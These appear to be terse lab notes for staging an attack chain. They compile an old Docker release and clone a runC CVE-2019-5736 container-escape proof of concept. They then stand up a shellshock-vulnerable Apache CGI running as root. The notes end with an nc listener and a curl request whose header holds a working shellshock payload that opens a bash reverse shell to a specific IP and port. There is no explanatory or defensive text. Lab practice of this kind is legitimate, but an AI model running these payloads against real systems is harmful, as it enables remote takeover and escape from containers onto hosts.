1. compile docker
https://ops.tips/blog/compiling-your-own-forked-docker-release/

apt-get install -y build-essential
apt-get install -y docker.io
git clone https://github.com/docker/docker-ce.git
git checkout v18.03.1-ce
make static DOCKER_BUILD_PKGS=static-linux
dpkg --purge docker.io

cp components/packaging/static/build/linux/* /usr/local/bin

2. set runC vuln
https://github.com/Frichetten/CVE-2019-5736-PoC
git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git
apt-get install -y goland-go
sudo docker run -it -v $(pwd):/app ubuntu:18.04 /bin/bash



3. set shellshock with apache running as root
sudo docker build -t pwn . 
sudo docker run pwn
curl 172.17.0.2/cgi-bin/index.bash

nc -lnvp 8888
curl 172.17.0.2/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/172.31.87.117/8888 0>&1 "
id


